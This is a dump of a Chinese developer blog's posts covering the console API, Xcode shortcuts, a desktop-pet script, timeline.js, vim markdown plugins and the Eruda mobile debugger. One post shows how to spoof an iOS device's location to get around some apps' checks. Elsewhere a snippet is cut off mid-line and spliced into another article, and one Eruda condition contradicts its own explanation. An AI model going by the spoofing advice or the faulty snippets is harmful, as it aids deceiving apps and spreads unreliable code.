console.group(); console.log(\"Level 2\"); console.group(); console.log(\"Level 3\"); console.warn(\"More of level 3\"); console.groupEnd(); console.log(\"Back to level 2\"); console.groupEnd(); console.debug(\"Back to the outer level\"); 输出看起来像这样： ","date":"2021-11-10","objectID":"/zh-cn/10/:2:2","tags":["浏览器","Web","命令行"],"title":"浏览器控制台命令调试——console","uri":"/zh-cn/10/"},{"categories":["浏览器","Web","命令行"],"content":"计时器 Requires Gecko 10.0(Firefox 10.0 / Thunderbird 10.0 / SeaMonkey 2.7) 为了计算特定操作的持续时间，Gecko 10 在 console 对象中引入了定时器的支持。要启动计时器，请调用 console.time() 方法，为其指定一个名称作为唯一参数。要停止计时器，并以毫秒为单位获取经过的时间，只需调用 console.timeEnd() 方法，再次将计时器的名称作为参数传递。在给定页面上最多可同时运行 10,000 个计时器。 例如，给定该代码： console.time(\"answer time\"); alert(\"Click to continue\"); console.timeEnd(\"answer time\"); 将记录用户查看警报框所需的时间： 注意： 重要的是要注意，如果您使用它来记录网络流量的时间，计时器将报告事务的总时间，而网络面板中列出的时间只是标头所需的时间。如果启用了响应正文日志记录，则响应标题和正文组合列出的时间应与您在控制台输出中看到的时间相匹配。 ","date":"2021-11-10","objectID":"/zh-cn/10/:2:3","tags":["浏览器","Web","命令行"],"title":"浏览器控制台命令调试——console","uri":"/zh-cn/10/"},{"categories":["浏览器","Web","命令行"],"content":"堆栈跟踪 控制台对象还支持输出堆栈跟踪；这将显示到达您调用 console.trace() 的点所需的调用路径。给出这样的代码： function foo() { function bar() { console.trace(); } bar(); } foo(); 控制台中的输出如下所示： ","date":"2021-11-10","objectID":"/zh-cn/10/:2:4","tags":["浏览器","Web","命令行"],"title":"浏览器控制台命令调试——console","uri":"/zh-cn/10/"},{"categories":["浏览器","Web","命令行"],"content":"规范 规范 状态 备注 Console API 现行的标准 初始定义。 ","date":"2021-11-10","objectID":"/zh-cn/10/:3:0","tags":["浏览器","Web","命令行"],"title":"浏览器控制台命令调试——console","uri":"/zh-cn/10/"},{"categories":["浏览器","Web","命令行"],"content":"桌面浏览器兼容性 特性 Chrome Edge Firefox Internet Explorer Opera Safari 基础支持 1 12 2 81 10.5 3 assert 1 12 28 8 11 4 clear 25 12 39 8 12 6.1 count 1 12 30 11 11 4 countReset 68 79 62 不支持 55 13 debug 1 12 4 10 11 4 dir 1 12 8 9 11 4 dirxml 1 12 39 11 11 4 error 1 12 4 8 10.5 3 exception (an alias for error) 不支持 13 — 79 28 不支持 不支持 不支持 group 1 12 4 11 11 4 groupCollapsed 6 12 9 11 11 5.1 groupEnd 1 12 9 11 11 4 info 1 12 4 8 10.5 3 log 1 12 4 8 10.5 3 profile 4 12 16 9 11 4 profileEnd 4 12 16 9 11 4 table 27 13 34 不支持 11 6.1 time 1 12 10 11 11 4 timeEnd 1 12 10 11 11 4 timeLog 71 79 62 不支持 60 13 timeStamp 14 12 39 11 15 6 trace 1 12 10 11 11 4 warn 1 12 4 8 10.5 3 在 Worker 中可用 支持 12 38 支持 支持 支持 ","date":"2021-11-10","objectID":"/zh-cn/10/:4:0","tags":["浏览器","Web","命令行"],"title":"浏览器控制台命令调试——console","uri":"/zh-cn/10/"},{"categories":["浏览器","Web","命令行"],"content":"移动浏览器兼容性 特性 Android Chrome for Android Edge mobile Firefox for Android IE mobile Opera Android iOS Safari 基础支持 1 18 未知 4 未知 11 1 assert 1 18 未知 28 未知 11 3.2 clear ≤37 25 未知 39 未知 12 7 count 1 18 未知 30 未知 11 3.2 countReset 68 68 未知 62 未知 48 13 debug 1 18 未知 4 未知 11 3.2 dir 1 18 未知 8 未知 11 3.2 dirxml 1 18 未知 39 未知 11 3.2 error 1 18 未知 4 未知 11 1 exception (an alias for error) 不支持 不支持 未知 28 未知 未知 不支持 group 37 18 未知 4 未知 11 3.2 groupCollapsed 37 18 未知 9 未知 11 5.1 groupEnd 37 18 未知 9 未知 11 3.2 info 1 18 未知 4 未知 11 1 log 1 18 未知 4 未知 11 1 profile ≤37 18 未知 16 未知 11 3.2 profileEnd ≤37 18 未知 16 未知 11 3.2 table ≤37 27 未知 34 未知 11 7 time 1 18 未知 10 未知 11 3.2 timeEnd 1 18 未知 10 未知 11 3.2 timeLog 71 71 未知 62 未知 50 13 timeStamp ≤37 18 未知 39 未知 14 6 trace 1 18 未知 10 未知 11 3.2 warn 1 18 未知 4 未知 11 1 在 Worker 中可用 支持 支持 未知 38 未知 未知 未知 \\1. 在 Internet Explorer 8 和 9 中，当未打开开发人员工具时，console 对象是 undefined。此行为已在 Internet Explorer 10 中修复。 \\2. 断言失败时抛出错误。 \\3. console.log 的别名 \\4. 不使用 Logger 记录数据。 \\5. console.group 的别名 \\6. console.error 的别名 ","date":"2021-11-10","objectID":"/zh-cn/10/:5:0","tags":["浏览器","Web","命令行"],"title":"浏览器控制台命令调试——console","uri":"/zh-cn/10/"},{"categories":["浏览器","Web","命令行"],"content":"注意 至少在 Firefox 中，如果页面定义了一个 console 对象，那么该对象将覆盖 Firefox 内置的对象。 在 Gecko 12.0 之前，控制台对象的方法仅在 Web 控制台打开时才起作用。从 Gecko 12.0 开始，输出将被缓存，直到打开 Web 控制台，然后显示。 值得注意的是 Firefox 的内置 Console 对象与 Firebug 提供的对象兼容。 ","date":"2021-11-10","objectID":"/zh-cn/10/:6:0","tags":["浏览器","Web","命令行"],"title":"浏览器控制台命令调试——console","uri":"/zh-cn/10/"},{"categories":["浏览器","Web","命令行"],"content":"相关链接 Web 控制台 — Firefox 中的 Web 控制台如何处理控制台 API 调用 远程调试i — 调试目标是移动设备时如何查看控制台输出 设备上的控制台日志记录 — 如何在 Firefox OS 设备输出日志 ","date":"2021-11-10","objectID":"/zh-cn/10/:7:0","tags":["浏览器","Web","命令行"],"title":"浏览器控制台命令调试——console","uri":"/zh-cn/10/"},{"categories":["Apple","MacOS","IOS","Xcode","终端"],"content":"\u003ciOS 效率提升\u003e利用 Xcode 打开终端(Terminal) 我们都知道IDEA 、 android studio 、vscode都有内置终端窗口，使用起来非常方便，然而Xcode 到目前还不支持。但是我们可以通过自定义Xcode 快捷键指令，来快速打开终端，并进入到项目根目录，来进行Git 或Cocopods 操作。 1.建立脚本 首先建立如下脚本, 功能是在当前工程根目录下打开终端: #!/bin/sh if [ -n \"$XcodeProjectPath\" ]; then open -a Terminal \"$XcodeProjectPath\"/.. else open -a Terminal \"$XcodeWorkspacePath\"/.. fi 并利用 chmod +x 将这个脚本设为可执行. ```bash chmod +x open_terminal_xcode.sh \u0026\u0026 chmod 777 open_terminal_xcode.sh ``` 2.将脚本设置到 Xcode 中 打开 Xcode 的 Behavior 界面, 如下所示: 打开 Xcode 的 Behavior 设置 然后点击如上图的加号, 出现新建的 Behavior: 新建 Behavior 并设置 将 behavior 的名称设置为 Open Terminal 或自定义的名字, 然后设置快捷键为 command + T 或自己想要的快捷键. 并且在右边的 Run 前面打钩, 然后将新建的脚本设置进去即可. 以后每次利用快捷键即可打开在 Xcode 中打开终端, 非常方便. alias youzy=\"你的项目路径\" alias openyouzy=\"cd 你的项目路径 \u0026\u0026 open *.xcworkspace\" Xcode 快捷键 最近在群里看到很多朋友在问 Xcode12 怎么代开控制台，我一直都是用快捷键所以没注意过这个问题。今天分享一下 Xcode 的快捷键！ 快捷键 说明 command + shift + y 打开控制台 command + shift + j 定位当前文件在导航 command + shift + o 输入后快速跳转到对应文件，还可输入方法名 command + shift + L 打开资源文件 command + shift + f 搜索项目 command + shift + k clean 项目 command + shift + t 新开当前项目 command + shift + , 编辑scheme command + shift + 2 打开可用调试设备 command + shift + w 关闭项目 command + r 运行项目 command + b build 项目 command + . 停止当前操作 command + 0 开启/关闭 导航 command + 1，2 … 9 实操看下效果吧 command + f 搜索当前文件 command + L 跳转到对应行 command + w 关闭当前文件 command + y 关闭断点调试 command + \\ 打断点 command + , 偏好设置 command + return 仅编辑器 control + 6 显示当前文件的方法，然后可以继续输方法名回车跳转 control + 0 切换 Target control + 4 切换项目 command + option + w 保留当前打开，关闭其他文件 欢迎补充比较实用的快捷键！ ","date":"2021-11-09","objectID":"/zh-cn/09/:0:0","tags":["Apple","MacOS","IOS","Xcode","终端"],"title":"Xcode 快速调用终端窗口","uri":"/zh-cn/09/"},{"categories":["前端","JS","CSS"],"content":"源代码： 用电脑💻访问此页才能看到娃娃🪆哟😏 #yanglikeu{position: fixed;z-index: 999999;bottom:0;left:-100px;opacity: 0.9;transform:scaleX(-1);animation-direction: alternate;animation-timing-function: linear;} (function () { var zc,zcCss,w1,w2,leftStart,leftEnd,speed,time,fx,isfirst; //预设变量 document.addEventListener(\"DOMContentLoaded\", function () {// 初始化 zc=document.querySelector(\"#yanglikeu\"), zcCss=document.querySelector(\"#zcCss\"), w1=document.body.scrollWidth, //页面宽度 w2=86, //桌宠宽度 leftStart=0-w2, //左边界 leftEnd=w1-w2, //右边界 speed=100, //每秒移动多少像素 time=parseInt(w1/speed), //动画时长 fx=\"r\", //桌宠方向 isfirst=true; //是否是第一次执行 zcmove(fx); //启动 zc.addEventListener(\"animationend\", function () { //动画播放完毕后再启动 isfirst=false; fx===\"r\"?fx=\"l\":fx=\"r\"; zcmove(fx); }); }); function zcmove(fx) { // 要注意两次的动画名要有区别，不然第二次就不正常了 if (!isfirst) { //如果已经不是第一次执行了，则把左边界设置为0（即不走出屏幕外） leftStart=0; } if (fx===\"r\") { //向右移动 zc.style.transform=\"scaleX(-1)\"; zcCss.innerHTML='@keyframes zcmove{' + 'from {left: '+leftStart+'px}' + 'to {left: '+leftEnd+'px}' + '}'; zc.style.animationName=\"zcmove\"; zc.style.animationDuration=time+\"s\"; }else if (fx===\"l\") { //向左移动 zc.style.transform=\"scaleX(1)\"; zcCss.innerHTML='@keyframes zcmove2{' + 'from {left: '+leftEnd+'px}' + 'to {left: '+leftStart+'px}' + '}'; zc.style.animationName=\"zcmove2\"; zc.style.animationDuration=time+\"s\"; } } })(); \u003c!-- 底部走动的桌宠 --\u003e \u003cimg id=\"yanglikeu\" src=\"/bc.gif\"\u003e \u003cstyle\u003e #yanglikeu{ position: fixed; z-index: 999999; bottom:0; left:-100px; opacity: 0.9; transform:scaleX(-1); animation-direction: alternate; animation-timing-function: linear; } \u003c/style\u003e \u003cstyle id=\"zcCss\"\u003e\u003c/style\u003e \u003cscript type=\"text/javascript\"\u003e (function () { var zc,zcCss,w1,w2,leftStart,leftEnd,speed,time,fx,isfirst; //预设变量 document.addEventListener(\"DOMContentLoaded\", function () {// 初始化 zc=document.querySelector(\"#yanglikeu\"), zcCss=document.querySelector(\"#zcCss\"), w1=document.body.scrollWidth, //页面宽度 w2=86, //桌宠宽度 leftStart=0-w2, //左边界 leftEnd=w1-w2, //右边界 speed=100, //每秒移动多少像素 time=parseInt(w1/speed), //动画时长 fx=\"r\", //桌宠方向 isfirst=true; //是否是第一次执行 zcmove(fx); //启动 zc.addEventListener(\"animationend\", function () { //动画播放完毕后再启动 isfirst=false; fx===\"r\"?fx=\"l\":fx=\"r\"; zcmove(fx); }); }); function zcmove(fx) { // 要注意两次的动画名要有区别，不然第二次就不正常了 if (!isfirst) { //如果已经不是第一次执行了，则把左边界设置为0（即不走出屏幕外） leftStart=0; } if (fx===\"r\") { //向右移动 zc.style.transform=\"scaleX(-1)\"; zcCss.innerHTML='@keyframes zcmove{' + 'from {left: '+leftStart+'px}' + 'to {left: '+leftEnd+'px}' + '}'; zc.style.animationName=\"zcmove\"; zc.style.animationDuration=time+\"s\"; }else if (fx===\"l\") { //向左移动 zc.style.transform=\"scaleX(1)\"; zcCss.innerHTML='@keyframes zcmove2{' + 'from {left: '+leftEnd+'px}' + 'to {left: '+leftStart+'px}' + '}'; zc.style.animationName=\"zcmove2\"; zc.style.animationDuration=time+\"s\"; } } })(); \u003c/script\u003e ","date":"2021-11-07","objectID":"/zh-cn/07-1/:0:0","tags":["前端","JS","CSS"],"title":"Web底部走动的桌宠","uri":"/zh-cn/07-1/"},{"categories":["Apple","MacOS","IOS","Xcode"],"content":"利用 Xcode 修改未越狱的 iOS 设备定位 修改手机定位是很多人都有的需求，有时候我们需要将手机位置修改成非自己实际所在的位置来测试或躲避某些 app 的审查。在 iOS 上，越狱后可以很方便地利用一些工具来修改定位，但实际上不越狱也能做到，下面就来说下如何使用 Mac 上的 Xcode 来实现这一需求。 ","date":"2021-11-07","objectID":"/zh-cn/07/:0:0","tags":["Apple","MacOS","IOS","Xcode"],"title":"利用 Xcode 修改未越狱的 iOS 设备定位","uri":"/zh-cn/07/"},{"categories":["Apple","MacOS","IOS","Xcode"],"content":"准备工具 一台装有 Xcode（可从 Mac App Store 安装）的 Mac 一部需要修改位置的 iOS 设备 一个可用的 Apple ID 一根数据线 ","date":"2021-11-07","objectID":"/zh-cn/07/:1:0","tags":["Apple","MacOS","IOS","Xcode"],"title":"利用 Xcode 修改未越狱的 iOS 设备定位","uri":"/zh-cn/07/"},{"categories":["Apple","MacOS","IOS","Xcode"],"content":"关于定位 手机中的定位是利用从多颗卫星接收到的信号来确定自己所在的坐标，即经（表南北方向）纬（表东西方向）度信息，而我们常见的经纬度坐标有三种标准来表示： WGS-84（World Geodetic System，世界大地测量系统，由美国制定，是目前世界上使用最广泛的地图坐标标准。） GCJ-02（地形图非线性保密处理算法，俗称火星坐标系、国测局坐标。高德地图和 Google Maps 国内等地图采用了此标准。） BD-09（百度地图使用的地理坐标系，其在GCJ-02上多增加了一次变换。） 而 iOS 系统中默认的标准为 WGS-84，所以我们需要在修改想要的位置前将坐标利用一些工具转换为WGS-84 标准，才能在中国修改为想要的坐标。 ","date":"2021-11-07","objectID":"/zh-cn/07/:2:0","tags":["Apple","MacOS","IOS","Xcode"],"title":"利用 Xcode 修改未越狱的 iOS 设备定位","uri":"/zh-cn/07/"},{"categories":["Apple","MacOS","IOS","Xcode"],"content":"获取坐标 下面以 “上海市静安寺地铁站” 的坐标为例： 从高德地图获取 GCJ-02 标准的地理位置坐标,为121.446221,31.223083 利用在线转换工具将获取到的经纬度坐标由 GCJ-02 标准转换为 WGS-84 标准，为121.44162141,31.22496412 ","date":"2021-11-07","objectID":"/zh-cn/07/:3:0","tags":["Apple","MacOS","IOS","Xcode"],"title":"利用 Xcode 修改未越狱的 iOS 设备定位","uri":"/zh-cn/07/"},{"categories":["Apple","MacOS","IOS","Xcode"],"content":"修改定位 打开 Xcode，点击“Create a new Xcode project”,选择创建一个 iOS 的 Single View App，点击“Next” 为你的项目填写一些基本信息，点击“Next”，并选择项目在 Mac 中的保存位置（这里需要一个开发者证书，可以在 Xcode 中的偏好设置里填写 Apple ID 申请一个，无需开发者账户，申请过程在这里不再详述。） 创建完成后的界面大致长这样 在左侧文件目录中右键，选择 “New File…” - “GPX File” - “Next” - “Create”，即可创建一个 gpx 文件 将刚刚转换好的经纬度信息填写到 gpx 文件的 “lat” 和 “lon” 中 把需要修改定位的 iOS 设备使用数据线连接到电脑并信任，在 Xcode 中将调试设备改为你刚刚连接电脑的设备，并点击设备左侧的项目名称，然后点击 “Edit Scheme”，在接下来弹出的窗口中把 “Default Location” 改成刚刚创建的 gpx 文件 在 Xcode 中点击运行按钮，并在 iOS 设备中信任证书，即可在 iOS 设备中调试此 app，此时打开地图或者其它可以定位的 app，会发现定位已经被修改成功，如需取消修改，可以将 app 退出或重启设备，如果不进行操作，结束调试一段时间后，iOS 设备也会自动恢复到正常定位。 注意要想不结束调试就直接拔掉数据线(手机也不要重启)⚠ ","date":"2021-11-07","objectID":"/zh-cn/07/:4:0","tags":["Apple","MacOS","IOS","Xcode"],"title":"利用 Xcode 修改未越狱的 iOS 设备定位","uri":"/zh-cn/07/"},{"categories":["前端","JS","CSS"],"content":"timeline.js-时间轴轻松创建时间线滑块 ","date":"2021-11-07","objectID":"/zh-cn/06/:0:0","tags":["前端","JS","CSS"],"title":"timeline.js-时间轴轻松创建时间线滑块","uri":"/zh-cn/06/"},{"categories":["前端","JS","CSS"],"content":"开始 ","date":"2021-11-07","objectID":"/zh-cn/06/:1:0","tags":["前端","JS","CSS"],"title":"timeline.js-时间轴轻松创建时间线滑块","uri":"/zh-cn/06/"},{"categories":["前端","JS","CSS"],"content":"1.1. 与包装经理一起安装 时间轴.js现已设置完毕，并准备与 Bower 和NPM一起使用，并可使用以下命令进行安装。 bower install timelinejs-slider npm install timelinejs-slider ","date":"2021-11-07","objectID":"/zh-cn/06/:1:1","tags":["前端","JS","CSS"],"title":"timeline.js-时间轴轻松创建时间线滑块","uri":"/zh-cn/06/"},{"categories":["前端","JS","CSS"],"content":"1.2. 基础知识 包括 jQuery 库和插件： \u003cscript type=\"text/javascript\" src=\"https://code.jquery.com/jquery-1.12.4.min.js\"\u003e\u003c/script\u003e \u003cscript type=\"text/javascript\" src=\"dist/js/timeline.min.js\"\u003e\u003c/script\u003e 包括插件 css 文件： \u003clink rel=\"stylesheet\" href=\"dist/css/timeline.min.css\" /\u003e Html 标记： \u003cdiv class=\"timeline-container timeline-theme-1\"\u003e \u003cdiv class=\"timeline js-timeline\"\u003e \u003cdiv data-time=\"2017\"\u003e your content or markup \u003c/div\u003e \u003cdiv data-time=\"2016\"\u003e your content or markup \u003c/div\u003e \u003cdiv data-time=\"2015\"\u003e your content or markup \u003c/div\u003e \u003cdiv data-time=\"2014\"\u003e your content or markup \u003c/div\u003e \u003cdiv data-time=\"2013\"\u003e your content or markup \u003c/div\u003e \u003c/div\u003e \u003c/div\u003e 开始插件： $('.js-timeline').Timeline(); ","date":"2021-11-07","objectID":"/zh-cn/06/:1:2","tags":["前端","JS","CSS"],"title":"timeline.js-时间轴轻松创建时间线滑块","uri":"/zh-cn/06/"},{"categories":["前端","JS","CSS"],"content":"例子 ","date":"2021-11-07","objectID":"/zh-cn/06/:2:0","tags":["前端","JS","CSS"],"title":"timeline.js-时间轴轻松创建时间线滑块","uri":"/zh-cn/06/"},{"categories":["前端","JS","CSS"],"content":"违约 $('.timeline-1').Timeline(); ","date":"2021-11-07","objectID":"/zh-cn/06/:2:1","tags":["前端","JS","CSS"],"title":"timeline.js-时间轴轻松创建时间线滑块","uri":"/zh-cn/06/"},{"categories":["前端","JS","CSS"],"content":"点位置顶部 $('.timeline-2').Timeline({ itemClass: 'box-item', dotsPosition: 'top', startItem: 'last' }); ","date":"2021-11-07","objectID":"/zh-cn/06/:2:2","tags":["前端","JS","CSS"],"title":"timeline.js-时间轴轻松创建时间线滑块","uri":"/zh-cn/06/"},{"categories":["前端","JS","CSS"],"content":"模式垂直和自动播放示例： $('.timeline-2').Timeline({ autoplay: true, mode: 'vertical', itemClass: 'box-item', }); ","date":"2021-11-07","objectID":"/zh-cn/06/:2:3","tags":["前端","JS","CSS"],"title":"timeline.js-时间轴轻松创建时间线滑块","uri":"/zh-cn/06/"},{"categories":["前端","JS","CSS"],"content":"选项 下面列出的可用选项。 名字 违约 类型 信息 自动播放 false true``false 启用自动播放 自动播放速 3000 int(ms) 以毫秒为限的自动播放速度 模式 'horizontal' 'horizontal'``'vertical' 确定滑块的结构。 项目类 'timeline-item' 'class-name' 时间轴项目类值。便于自定义。 点类 'timeline-dots' 'class-name' 时间轴日期的容器类值。 开始 'first' 'first'``'last'``'number' 它决定哪些内容将在启动时激活。 点定位 'bottom' 'bottom'``'top'``'left'``'right' 设置时间轴日期的位置。顶部和底部仅用于水平位置。并且左侧和右侧仅使用垂直位置。 活动类 'slide-active' 'class-name' 时间线项目和日期活动类 预科类 'slide-prev' 'class-name' 时间轴项目和日期预科类 下一类 'slide-next' 'class-name' 下一堂课的时间线项目和日期 暂停霍夫 true true``false 暂停悬停上的自动播放 暂停多特霍夫 false true``false 当点悬停时暂停自动播放 ","date":"2021-11-07","objectID":"/zh-cn/06/:3:0","tags":["前端","JS","CSS"],"title":"timeline.js-时间轴轻松创建时间线滑块","uri":"/zh-cn/06/"},{"categories":[],"content":" 新开始 成立 Mr·Yang 旗下 Mr·Yang Team , 使用域名 ybrc.github.io 再次重生 重生 结束 ","date":"2021-11-07","objectID":"/zh-cn/timeline/:0:0","tags":[],"title":"时间线","uri":"/zh-cn/timeline/"},{"categories":["vim","命令行IDE"],"content":"Vim安装插件支持 MarkDown 语法、实时预览等 使用 markdown-preview.vim 插件可以实时通过浏览器预览 markdown 文件 使用该插件需要 vim 支持py2/py3 ","date":"2021-11-05","objectID":"/zh-cn/05/:0:0","tags":["vim","命令行IDE"],"title":"Vim安装插件支持 MarkDown 语法、实时预览等","uri":"/zh-cn/05/"},{"categories":["vim","命令行IDE"],"content":"安装 使用 vim-plug: 在 .vimrc 或 init.vim 配置文件中添加 Plug 'iamcco/markdown-preview.vim' 然后运行 :PlugInstall 命令 如果需要预览数学公式，还需要安装 mathjax-support-for-mkdp 插件： Plug 'iamcco/mathjax-support-for-mkdp' Plug 'iamcco/markdown-preview.vim' ","date":"2021-11-05","objectID":"/zh-cn/05/:1:0","tags":["vim","命令行IDE"],"title":"Vim安装插件支持 MarkDown 语法、实时预览等","uri":"/zh-cn/05/"},{"categories":["vim","命令行IDE"],"content":"设置 let g:mkdp_path_to_chrome = “firefox” \" 设置 chrome 浏览器的路径（或是启动 chrome（或其他现代浏览器）的命令） \" 如果设置了该参数, g:mkdp_browserfunc 将被忽略 let g:mkdp_browserfunc = ‘MKDP_browserfunc_default’ \" vim 回调函数, 参数为要打开的 url let g:mkdp_auto_start = 1 \" 设置为 1 可以在打开 markdown 文件的时候自动打开浏览器预览，只在打开 \" markdown 文件的时候打开一次 let g:mkdp_auto_open = 1 \" 设置为 1 在编辑 markdown 的时候检查预览窗口是否已经打开，否则自动打开预 \" 览窗口 let g:mkdp_auto_close = 1 \" 在切换 buffer 的时候自动关闭预览窗口，设置为 0 则在切换 buffer 的时候不 \" 自动关闭预览窗口 let g:mkdp_refresh_slow = 0 \" 设置为 1 则只有在保存文件，或退出插入模式的时候更新预览，默认为 0，实时 \" 更新预览 let g:mkdp_command_for_global = 0 \" 设置为 1 则所有文件都可以使用 MarkdownPreview 进行预览，默认只有 markdown \" 文件可以使用改命令 let g:mkdp_open_to_the_world = 0 \" 设置为 1, 在使用的网络中的其他计算机也能访问预览页面 \" 默认只监听本地（127.0.0.1），其他计算机不能访问 nmap MarkdownPreview \" 普通模式 imap MarkdownPreview \" 插入模式 nmap StopMarkdownPreview \" 普通模式 imap StopMarkdownPreview \" 插入模式 也可以用插件markdown-preview-sync https://github.com/pingao777/markdown-preview-sync.git ","date":"2021-11-05","objectID":"/zh-cn/05/:1:1","tags":["vim","命令行IDE"],"title":"Vim安装插件支持 MarkDown 语法、实时预览等","uri":"/zh-cn/05/"},{"categories":["vim","命令行IDE"],"content":"安装方式 如果你使用pathogen，将release中的markdown-preview-sync放到bundle文件夹即可。 ","date":"2021-11-05","objectID":"/zh-cn/05/:1:2","tags":["vim","命令行IDE"],"title":"Vim安装插件支持 MarkDown 语法、实时预览等","uri":"/zh-cn/05/"},{"categories":["vim","命令行IDE"],"content":"设置 \" Chrome和Firefox都可以，推荐使用Chrome \" 可以这样设置Chrome路径 let g:markdown_preview_sync_chrome_path = \"\" \" 设置Firefox浏览器路径 let g:markdown_preview_sync_firefox_path = \"\" \" (Optional)设置自定义CSS主题，将你的CSS文件放在autoload/java/webapp/css文件夹下， \" 以“主题名-theme.css”方式命名，然后设置如下变量 let g:markdown_preview_sync_theme = \"主题名\" \" 配置快捷键 autocmd filetype markdown nnoremap \u003cF9\u003e :MarkSyncPreview\u003ccr\u003e autocmd filetype markdown nnoremap \u003cS-F9\u003e :MarkSyncClose\u003ccr\u003e ","date":"2021-11-05","objectID":"/zh-cn/05/:1:3","tags":["vim","命令行IDE"],"title":"Vim安装插件支持 MarkDown 语法、实时预览等","uri":"/zh-cn/05/"},{"categories":["前端","移动端","调试工具"],"content":"手机移动端调试工具 ","date":"2021-11-04","objectID":"/zh-cn/11-4/:0:0","tags":[],"title":"手机移动端调试工具","uri":"/zh-cn/11-4/"},{"categories":["前端","移动端","调试工具"],"content":"1. Eruda Eruda 是一个专为手机网页前端设计的调试面板，类似 DevTools 的迷你版，其主要功能包括：捕获 console 日志、检查元素状态、捕获XHR请求、显示本地存储和 Cookie 信息等等。 ","date":"2021-11-04","objectID":"/zh-cn/11-4/:1:0","tags":[],"title":"手机移动端调试工具","uri":"/zh-cn/11-4/"},{"categories":["前端","移动端","调试工具"],"content":"1.1 功能特性移动浏览器控制台 按钮拖拽，面板透明度大小设置。 Console 面板：捕获 Console 日志，支持 log、error、info、warn、dir、time/timeEnd、clear、count、assert、table；支持占位符，包括 %c 自定义样式输出；支持按日志类型及正则表达式过滤；支持 JavaScript 脚本执行。 Elements 面板：查看标签内容及属性；查看应用在 Dom 上的样式；支持页面元素高亮；支持屏幕直接点击选取；查看 Dom 上绑定的各类事件。 Network 面板：捕获请求，查看发送数据、返回头、返回内容等信息。 Resources 面板：查看并清除 localStorage、sessionStorage 及 cookie；查看页面加载脚本及样式文件；查看页面加载图片。 Sources 面板：查看页面源码；格式化 html，css，js 代码及 json 数据。 Info 面板：输出 URL 及 User Agent；支持自定义输出内容。 Snippets 面板：页面元素添加边框；加时间戳刷新页面；支持自定义代码片段。 ","date":"2021-11-04","objectID":"/zh-cn/11-4/:1:1","tags":[],"title":"手机移动端调试工具","uri":"/zh-cn/11-4/"},{"categories":["前端","移动端","调试工具"],"content":"1.2 快速上手 ","date":"2021-11-04","objectID":"/zh-cn/11-4/:1:2","tags":[],"title":"手机移动端调试工具","uri":"/zh-cn/11-4/"},{"categories":["前端","移动端","调试工具"],"content":"安装 你可以在下午得到它。 npm install eruda --save 将此脚本添加到您的页面。 \u003cscript src=\"node_modules/eruda/eruda.js\"\u003e\u003c/script\u003e \u003cscript\u003eeruda.init();\u003c/script\u003e 它也可在js 德利夫和cdnjs上找到。 \u003cscript src=\"//cdn.jsdelivr.net/npm/eruda\"\u003e\u003c/script\u003e \u003cscript\u003eeruda.init();\u003c/script\u003e JavaScript 文件大小相当大（约 100kb gzib），因此不适合在移动页面中包含。建议确保埃鲁达只有在 eruda 设置为在 url 上（http://example.com/?eruda=true）上真实时才加载 eruda，例如： ;(function () { var src = '//cdn.jsdelivr.net/npm/eruda'; if (!/eruda=true/.test(window.location) \u0026\u0026 localStorage.getItem('active-eruda') != 'true') return; document.write('\u003cscr' + 'ipt src=\"' + src + '\"\u003e\u003c/scr' + 'ipt\u003e'); document.write('\u003cscr' + 'ipt\u003eeruda.init();\u003c/scr' + 'ipt\u003e'); })(); ","date":"2021-11-04","objectID":"/zh-cn/11-4/:2:0","tags":[],"title":"手机移动端调试工具","uri":"/zh-cn/11-4/"},{"categories":["前端","移动端","调试工具"],"content":"配置 初始化时，配置对象可以传递。 容器：容器元件。如果不设置，它将在 html 根元素下直接附加一个元素。 工具：选择您想要的默认工具，默认情况下将添加所有工具。 欲了解更多信息，请查看文档。 let el = document.createElement('div'); document.body.appendChild(el); eruda.init({ container: el, tool: ['console', 'elements'] }); ","date":"2021-11-04","objectID":"/zh-cn/11-4/:3:0","tags":[],"title":"手机移动端调试工具","uri":"/zh-cn/11-4/"},{"categories":["前端","移动端","调试工具"],"content":"插件 埃鲁达 fps： 显示页面 fps 信息。 埃鲁达功能： 浏览器功能检测。 埃鲁达时间：显示性能和资源计时。 埃鲁达记忆： 显示页面内存信息。 埃鲁达代码： 运行爪哇脚本代码。 埃鲁达基准： 运行爪哇脚本基准。 埃鲁达地理定位：测试地理位置。 埃鲁达多姆： 导航多姆树。 埃鲁达方向：测试方向阿皮。 埃鲁达触摸：可视化屏幕触摸。 如果您想自己创建一个插件，请按照这里的指南 ","date":"2021-11-04","objectID":"/zh-cn/11-4/:4:0","tags":[],"title":"手机移动端调试工具","uri":"/zh-cn/11-4/"},{"categories":["前端","移动端","调试工具"],"content":"1.3 测试预览 ","date":"2021-11-04","objectID":"/zh-cn/11-4/:4:1","tags":[],"title":"手机移动端调试工具","uri":"/zh-cn/11-4/"},{"categories":["前端","移动端","调试工具"],"content":"演示 在手机上浏览：https://eruda.liriliri.io/ 为了尝试不同的网站，请在浏览器地址栏上执行下面的脚本。 javascript:(function () { var script = document.createElement('script'); script.src=\"//cdn.jsdelivr.net/npm/e 使用技巧 這才是本文重點。Eruda的基本使用方法推薦使用CDN和可配置引數的形式，在頁面引入如下程式碼： ;(function () { var src = '//cdn.bootcss.com/eruda/1.2.4/eruda.min.js'; if (!/eruda=true/.test(window.location) \u0026\u0026 localStorage.getItem('active-eruda') !== 'true') return; document.write('\u003cscr' + 'ipt src=\"' + src + '\"\u003e\u003c/scr' + 'ipt\u003e'); document.write('\u003cscr' + 'ipt\u003eeruda.init();\u003c/scr' + 'ipt\u003e'); })(); eruda.init();裡面可以傳入要初始化哪些面板，預設載入所有。 這樣使用方式沒有錯，但是如果Eruda要跟著釋出到線上的話，那我們要刪除這段程式碼？因為這樣會不管你需不需要除錯Eruda都會立即載入，在頁面出現Eruda的圖示。我的目標是，Eruda可以保留在頁面裡，無論什麼環境，只要我們想呼喚它出現的時候它才出現，不需要它的時候它只是一段不會生效的普通程式碼。 我想到的辦法是：首先把上述引入程式碼的src放到if裡，同時把localStorage改為sessionStorage，active-eruda引數也可以改個更短的名字，改後的程式碼如下： ;(function () { if (!/eruda=true/.test(window.location) || sessionStorage.getItem('eruda') !== 'true') return; var src = '//cdn.bootcss.com/eruda/1.2.4/eruda.min.js'; document.write('\u003cscr' + 'ipt src=\"' + src + '\"\u003e\u003c/scr' + 'ipt\u003e'); document.write('\u003cscr' + 'ipt\u003eeruda.init();\u003c/scr' + 'ipt\u003e'); })(); 這段程式碼的意思是如果URL中有引數eruda=true或者sessionStorage中eruda的值為true才載入Eruda。這樣的好處是，我們需要除錯的時候可以在網頁URL後面加個引數即可，不需要除錯的它不會載入。 